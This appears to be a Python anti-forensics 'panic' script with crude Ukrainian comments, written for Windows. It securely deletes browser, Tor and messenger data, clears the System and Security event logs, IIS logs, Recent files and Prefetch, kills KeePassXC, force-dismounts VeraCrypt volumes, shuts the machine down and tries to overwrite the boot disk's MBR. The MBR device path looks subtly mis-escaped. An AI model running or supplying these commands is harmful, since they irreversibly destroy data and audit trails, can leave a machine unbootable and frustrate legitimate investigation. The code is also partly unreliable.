import os
import random


# Найкраща функція видалення файлів
def secure_delete_file(file_path, passes=1):
    if not os.path.isfile(file_path):
        return

    length = os.path.getsize(file_path)

    with open(file_path, "wb") as f:
        for _ in range(passes):
            f.write(os.urandom(length))

    new_file_path = file_path + "".join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=10))
    os.rename(file_path, new_file_path)
    os.remove(new_file_path)


# Найкраща функція видалення мамок
def secure_delete_folder(folder_path, passes=1):
    if not os.path.isdir(folder_path):
        return

    for root, dirs, files in os.walk(folder_path, topdown=False):
        for name in files:
            file_path = os.path.join(root, name)
            secure_delete_file(file_path, passes)

        for name in dirs:
            dir_path = os.path.join(root, name)
            os.rmdir(dir_path)

    os.rmdir(folder_path)


# Найкраща функція блокування екрану та завершення роботи
def lock_and_restart():
    os.system("rundll32.exe user32.dll,LockWorkStation")
    os.system("shutdown /s /t 0")


# Найкраща функція розмонтування криптоконтейнерів
def demount():
    os.system("veracrypt /d /q /f")
    os.system("truecrypt /d /q /f")
    os.system("taskkill /im KeePassXC.exe /f")  # Потрібні права адміну


# Найкраща функція чищення браузерів
def clear_browsers(passes):
    username = os.getlogin()
    # Вичищення Хрому
    os.system("taskkill /im chrome.exe /f")
    secure_delete_folder(f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data", passes)

    # Вичищення лисиці
    os.system("taskkill /im firefox.exe /f")
    secure_delete_folder(f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", passes)

    # Вичищення чмоперы
    os.system("taskkill /im opera.exe /f")
    secure_delete_folder(f"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera Stable", passes)

    # Вичищення Tor (твої матюки, наркотики та голі цицьки)
    secure_delete_folder(f"C:\\Users\\{username}\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Data", passes)


# Найкраща функція чищення логiв
def delete_logs(passes):
    username = os.getlogin()
    # Вичищення Event Viewer
    os.system(f"wevtutil cl System")
    os.system(f"wevtutil cl Application")
    os.system(f"wevtutil cl Security")
    os.system(f"wevtutil cl Setup")
    os.system(f"wevtutil cl Forwarded Events")

    # Вичищення журналів IIS
    secure_delete_folder("C:\\inetpub\\logs\\LogFiles", passes)

    # Вичищення журналів Recent Files
    secure_delete_folder(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Recent", passes)

    # Вичищення журналів Prefetch
    secure_delete_folder("C:\\Windows\\Prefetch", passes)


# Найкраща функція знищення МБР
def MBR_unichtoshalyty(passes):
    device_path = "\\.\\PhysicalDrive0"
    mbr_size = 512
    random_data = bytearray([random.randint(0, 255) for _ in range(mbr_size)])
    with open(device_path, 'wb') as device:
        for _ in range(passes):
            device.write(random_data)


# Найкраща функція знищення месенжерів
def clear_msgers(passes):
    username = os.getlogin()
    os.system("taskkill /im session.exe /f")
    secure_delete_folder(f"C:\\Users\\{username}\\AppData\\Roaming\\Session", passes)

    os.system("taskkill /im element.exe /f")
    secure_delete_folder(f"C:\\Users\\{username}\\AppData\\Roaming\\Element", passes)


def clear_networks(passes):
    os.system("net stop WlanSvc")
    secure_delete_folder("C:\\ProgramData\\Microsoft\\Wlansvc", passes)